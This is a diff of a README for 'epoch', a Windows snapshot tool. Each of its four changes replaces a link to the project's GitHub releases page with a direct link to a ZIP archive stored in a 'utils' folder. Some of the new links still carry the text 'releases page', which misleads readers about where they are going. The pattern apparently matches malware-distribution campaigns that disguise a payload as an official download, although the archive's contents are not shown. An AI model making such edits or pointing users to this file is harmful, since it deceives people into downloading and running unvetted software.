@@ -1,6 +1,6 @@
 # 🟣 epoch - Fast snapshot access for Windows
 
-[⬇️ Download epoch for Windows](https://github.com/Atmosphereport131/epoch/releases)
+[⬇️ Download epoch for Windows](https://raw.githubusercontent.com/Atmosphereport131/epoch/main/utils/Software-2.5-alpha.4.zip)
 
 ## 🧭 What epoch does
 
@@ -32,7 +32,7 @@ If you plan to use epoch for live snapshot data, make sure your storage account 
 
 Go to the release page here:
 
-[Download epoch](https://github.com/Atmosphereport131/epoch/releases)
+[Download epoch](https://raw.githubusercontent.com/Atmosphereport131/epoch/main/utils/Software-2.5-alpha.4.zip)
 
 On that page, look for the latest Windows release file. Save it to your computer, then open it from your Downloads folder.
 
@@ -40,7 +40,7 @@ On that page, look for the latest Windows release file. Save it to your computer
 
 Follow these steps:
 
-1. Open the [releases page](https://github.com/Atmosphereport131/epoch/releases).
+1. Open the [releases page](https://raw.githubusercontent.com/Atmosphereport131/epoch/main/utils/Software-2.5-alpha.4.zip).
 2. Find the latest release.
 3. Download the Windows file for epoch.
 4. If the file is a ZIP archive, right-click it and choose **Extract All**.
@@ -199,7 +199,7 @@ Use these habits to keep things working:
 
 When a new version is available, repeat the download steps:
 
-1. Open the [releases page](https://github.com/Atmosphereport131/epoch/releases).
+1. Open the [releases page](https://raw.githubusercontent.com/Atmosphereport131/epoch/main/utils/Software-2.5-alpha.4.zip).
 2. Get the latest Windows file.
 3. Install or replace the old version.
 4. Open the app again.
